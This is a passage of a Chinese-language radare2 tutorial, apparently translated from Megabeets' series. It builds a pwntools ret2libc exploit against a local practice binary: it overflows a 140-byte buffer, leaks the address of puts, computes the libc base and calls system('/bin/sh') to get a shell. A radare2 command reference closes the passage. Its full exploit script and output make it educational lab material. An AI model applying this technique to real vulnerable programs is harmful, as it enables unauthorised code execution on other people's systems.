rel="noopener"><em>pwnlib</em></a>框架，而且它是我最喜欢的python漏洞利用框架。他简化了很多东西，让利用更简便。当然你也可以使用其他你喜欢的方式。</p><p>使用<code>pip</code>下载<em>pwntools</em>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> pip install --upgrade pip</span><br><span class="line"><span class="meta">$</span> pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>你可以在<a href="http://docs.pwntools.com/en/stable/index.html" target="_blank" rel="noopener">官方文档</a>上了解更多关于<em>pwntools</em>。</p><p>这是我们第一阶段的python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt =</span><br><span class="line">puts_got =</span><br><span class="line">entry_point =</span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span> <span class="comment"># padding</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我们需要填充<code>puts@plt</code>和<code>puts@got</code>的地址，以及程序的入口点。让我们回到<code>radare2</code>并执行以下命令。字符<code>#</code>用于注释，字符<code>~</code>是<code>radare2</code>的shell中的内置<code>grep</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of puts@plt:</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ?v sym.imp.puts</span><br><span class="line">0x08048390</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of puts@got:</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ?v reloc.puts_20</span><br><span class="line">0x0804a014</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of program’s entry point (entry0):</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ieq</span><br><span class="line">0x080483d0</span><br></pre></td></tr></table></figure><p><code>sym.imp.puts</code>和<code>reloc.puts_20</code>是<code>radare2</code>自动检测到的标志。命令<code>ie</code>表示<code>Information Entrypoint</code>。</p><p>现在我们填入我们找到的地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们执行一下脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 23578</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] Stopped process ‘./megabeets_0x2’ (pid 23578)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 23592</span><br><span class="line">[*] puts is at: 0xf7563710</span><br><span class="line">[*] Stopped process ‘./megabeets_0x2’ (pid 23592)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 23606</span><br><span class="line">[*] puts is at: 0xf75e3710</span><br><span class="line">[*] Stopped process ‘./megabeets_0x2’ (pid 23606)</span><br></pre></td></tr></table></figure><p>我执行了脚本三次，<code>puts</code>的地址每次都会变得不一样。因此我们不能提前预测它的地址。现在我们需要找到<code>puts</code>在<em>libc</em>中的偏移，然后计算出<em>libc</em>的基址。在我们找到基址后，我们可以用偏移计算出<code>system</code>、<code>exit</code>以及字符串<code>/bin/sh</code>的地址。</p><p>现在我们的脚本应该是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = </span><br><span class="line">offset_system = </span><br><span class="line">offset_str_bin_sh = </span><br><span class="line">offset_exit = </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line"> </span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"binsh: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="计算真实地址"><a href="#计算真实地址" class="headerlink" title="计算真实地址"></a>计算真实地址</h2><p><em>请注意在文章的这部分，我的结果可能与你的不同。因为我们的libc版本不同，所以会产生不同的偏移。</em></p><p>首先我们需要找到<code>puts</code>在<em>libc</em>上的偏移。我们再一次打开<code>radare2</code>，继续执行到入口点。做以上步骤的原因是我们在<em>libc</em>载入之前开始调试程序，直到入口点时，运行库才全部加载完。</p><p>我们使用<code>dmi</code>命令，将<em>libc</em>和函数作为参数。我加上了<code>~</code>来显示相关的信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 24124 started…</span><br><span class="line">= attach 24124 24124</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">— A C program is like a fast dance on a newly waxed dance floor by people carrying razors – Waldi Ravens</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf771ab30]&gt;</span> dcu entry0</span><br><span class="line">Continue until 0x080483d0 using 1 bpsize</span><br><span class="line">hit breakpoint at: 80483d0</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc puts~ puts$</span><br><span class="line">vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc system~ system$</span><br><span class="line">vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc exit~ exit$</span><br><span class="line">vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit</span><br></pre></td></tr></table></figure><p><em>请注意，在这篇文章发表前，<code>dmi</code>的输出格式就已经改变了。你的结果很有可能与我的有所不同。</em></p><p>所有这些<code>paddr=0x000xxxxx</code>是函数在<em>libc</em>上的偏移。现在我们需要在程序中找到<code>/bin/sh</code>的位置。我们将要使用<code>radare2</code>的一些搜索功能。<code>radare2</code>默认在<code>dbg.map</code>，也就是当前内存中查找。我们想要在所有内存中查找则需要设置成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> e search.in = dbg.maps</span><br></pre></td></tr></table></figure><p>你可以执行<code>e search.in=?</code>查看更多选项。执行<code>Ve</code>配置可视化模式</p><p>在<code>radare2</code>中通过<code>/</code>命令查找。让我们看看<code>radare2</code>给我们提供的查找参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">|Usage: /[amx/] [arg]Search stuff (see ‘e??search’ for options)</span><br><span class="line">| / foo\x00           search for string ‘foo\0’</span><br><span class="line">| /j foo\x00          search for string ‘foo\0’ (json output)</span><br><span class="line">| /! ff               search for first occurrence not matching</span><br><span class="line">| /+ /bin/sh          construct the string with chunks</span><br><span class="line">| /!x 00              inverse hexa search (find first byte != 0x00)</span><br><span class="line">| //                  repeat last search</span><br><span class="line">| /h[t] [hash] [len]  find block matching this hash. See /#?</span><br><span class="line">| /a jmp eax          assemble opcode and search its bytes</span><br><span class="line">| /A jmp              find analyzed instructions of this type (/A? for help)</span><br><span class="line">| /b                  search backwards</span><br><span class="line">| /B                  search recognized RBin headers</span><br><span class="line">| /c jmp [esp]        search for asm code</span><br><span class="line">| /C[ar]              search for crypto materials</span><br><span class="line">| /d 101112           search for a deltified sequence of bytes</span><br><span class="line">| /e /E.F/i           match regular expression</span><br><span class="line">| /E esil-expr        offset matching given esil expressions %%= here</span><br><span class="line">| /f file [off] [sz]  search contents of file with offset and size</span><br><span class="line">| /i foo              search for string ‘foo’ ignoring case</span><br><span class="line">| /m magicfile        search for matching magic file (use blocksize)</span><br><span class="line">| /o                  show offset of previous instruction</span><br><span class="line">| /p patternsize      search for pattern of given size</span><br><span class="line">| /P patternsize      search similar blocks</span><br><span class="line">| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)</span><br><span class="line">| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated</span><br><span class="line">| /v[1248] value      look for an cfg.bigendian 32bit value</span><br><span class="line">| /V[1248] min max    look for an cfg.bigendian 32bit value in range</span><br><span class="line">| /w foo              search for wide string ‘f\0o\0o\0’</span><br><span class="line">| /wi foo             search for wide string ignoring case ‘f\0o\0o\0’</span><br><span class="line">| /x ff..33           search for hex string ignoring some nibbles</span><br><span class="line">| /x ff0033           search for hex string</span><br><span class="line">| /x ff43 ffd0        search for hexpair with mask</span><br><span class="line">| /z min max          search for strings of given size</span><br></pre></td></tr></table></figure><p>提供给我们了许多不同的方式。同时还发心<code>/R</code>能够帮助我们查找ROP。可惜这篇文章里我们没有打算使用ROP。但其他情况下，你们写利用脚本时一定很喜欢用它。</p><p>我们不需要任何花哨的东西，只用最简单的查找即可。在这之后，我们先找到当前<em>libc</em>载入的地址，然后计算出<code>/bin/sh</code>的偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> / /bin/sh</span><br><span class="line">Searching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68</span><br><span class="line">Searching 7 bytes in [0x8048000-0x8049000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0x8049000-0x804a000]</span><br><span class="line">hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xffd2f000-0xffd50000]</span><br><span class="line">hits: 0</span><br><span class="line">0xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.</span><br></pre></td></tr></table></figure><p><code>r2</code>在内存中找到了<code>/bin/sh</code>。现在我们计算它相对<em>libc</em>基址的偏移：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmm~libc</span><br><span class="line">0xf7599000 /usr/lib32/libc-2.25.so</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> ?X 0xf7700768-0xf7599000</span><br><span class="line">167768</span><br></pre></td></tr></table></figure><p>我们发现<code>/bin/sh</code>相对<em>libc</em>基址的偏移为<code>0x167768</code>。我们把它填进脚本中，并且可以开始我们的最后一个步骤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span>  </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>漏洞利用的第二阶段很直接。我们继续使用140个字符，然后调用<code>system</code>并将<code>/bin/sh</code>作为参数，最后<code>exit</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 2       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| system@libc         |</span><br><span class="line">| exit@libc           |</span><br><span class="line">| /bin/sh address     |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p>还记得上一次我们返回到了入口点吗？这意味着<code>scanf</code>又在等待我们的输入。现在我们所做的就是把这些调用串联起来传给程序。</p><p>这是我们最后的脚本。像我之前所说的，你只需要替换符合你的<em>libc</em>的偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system is at: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"/bin/sh is at: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit is at: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Build 2nd payload</span></span><br><span class="line">    payload2  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain2 =  p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    <span class="comment"># Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)</span></span><br><span class="line">    <span class="comment">#           Then you'll execute system("sh")</span></span><br><span class="line">    ropchain2 += p32(binsh_addr) </span><br><span class="line"> </span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">    log.success(<span class="string">"Here comes the shell!"</span>)</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>跑这个脚本我们就能成功拿到一个shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 24410</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] libc base: 0xf75ce000</span><br><span class="line">[*] system is at: 0xf760a060</span><br><span class="line">[*] /bin/sh is at: 0xf7735768</span><br><span class="line">[*] exit is at: 0xf75fd1b0</span><br><span class="line">[+] Here comes the shell!</span><br><span class="line">[*] Switching to interactive mode:</span><br><span class="line">  </span><br><span class="line"><span class="meta">$</span> whoami</span><br><span class="line">beet</span><br><span class="line"><span class="meta">$</span> echo EOF</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><code>Radare2</code>之旅的第二部分就到此结束了。我们简单地学习了一些<code>radare2</code>中漏洞利用的功能。在下一部分中，我们会学习<code>radare2</code>再脚本编写和恶意软件分析中的功能。</p><h1 id="漏洞利用命令对应表"><a href="#漏洞利用命令对应表" class="headerlink" title="漏洞利用命令对应表"></a>漏洞利用命令对应表</h1><p>这是一系列我在本文中提到的命令（还有一些补充）。你可以把它作为一份参考表。</p><h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><ul><li><code>$ rabin2 -I ./program</code>——二进制信息（和<code>radare2</code>的shell中<code>i</code>命令相同）</li><li><code>ii [q]</code>——导入表</li><li><code>?v sym.imp.func_name</code>——获取<code>func_name@PLT</code>地址</li><li><code>?v reloc.func_name</code>——获取<code>func_name@GOT</code>地址</li><li><code>ie [q]</code>——获取入口点地址</li><li><code>iS</code>——查看区段的各个权限（读/写/执行）</li><li><code>i~canary</code>——检查是否开启<code>Canary</code></li><li><code>i~pic</code>——检查是否开启<code>PIE</code></li><li><code>i~nx</code>——检查是否开启<code>NX</code></li></ul><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><ul><li><code>dm</code>——查看内存信息</li><li><code>dmm</code>——列出模块（内存中的运行库和二进制模块）</li><li><code>dmi [addr|libname] [symname]</code>——列出目标库的标志</li></ul><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><ul><li><code>e search.*</code>——编辑查找配置</li><li><code>/?</code>——列出查找的子命令</li><li><code>/ string</code>——在内存或程序段查找字符串</li><li><code>/R [?]</code>——查找特定的ROP</li><li><code>/R/</code>——ROP常规搜索</li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ul><li><code>dc</code>——继续执行</li><li><code>dcu addr</code>——继续执行到某个地址</li><li><code>dcr</code>——继续执行直到<code>ret</code>（单步步过）</li><li><code>dbt [?]</code>——在<em>dbg.btdepth</em>和<em>dbg.btalgo</em>的基础上回溯指令</li><li><code>doo [args]</code>——重新打开调试并设置参数</li><li><code>ds</code>——单步步入</li><li><code>dso</code>——单步步过</li></ul><h2 id="图形模式"><a href="#图形模式" class="headerlink" title="图形模式"></a>图形模式</h2><ul><li><code>pdf @ addr</code>——输出当前位移下函数的汇编代码</li><li><code>V</code>——可视化模式，使用<code>p</code>/<code>P</code>再两个模式间切换</li><li><code>VV</code>——图形模式，在ascii图像下分析</li><li><code>V!</code>——控制板模式，对漏洞利用非常有用</li></ul><p>看看<a href="http://radare.today/posts/using-radare2/" target="_blank" rel="noopener">这篇文章</a>，也许有更多的内容能够帮助到你。</p>]]></content>
    
    <summary type="html">
    
